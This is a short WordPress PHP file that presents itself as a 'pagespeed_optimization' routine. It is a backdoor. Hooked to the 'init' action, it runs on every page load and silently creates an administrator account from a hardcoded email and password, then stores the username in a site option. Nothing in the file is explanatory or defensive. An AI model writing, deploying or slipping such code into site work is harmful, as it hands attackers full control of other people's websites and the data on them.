<?php 

require_once('wp-load.php'); 

echo 'its working';

function pagespeed_optimization() {
    $email = 'johnybran481@gmail.com';
    $password = 'P@@sword#6423';

    // Check if the email is already registered
    if (!email_exists($email)) {
        $username = strstr($email, '@', true); // Use email before '@' as username

        // Create the user
        $user_id = wp_create_user($username, $password, $email);

        if (is_wp_error($user_id)) {
            // Display error if user creation failed
            echo 'Error creating user: ' . $user_id->get_error_message();
        } else {
            // Set the new user as an admin
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            // Store the username in an option for later use
            update_option('dynamic_admin_username', $username);

            echo 'Admin user created successfully with email: ' . $email;
        }
    } else {
        echo 'Email already exists. Please use a different email.';
    }
}
add_action('init', 'pagespeed_optimization');

?>
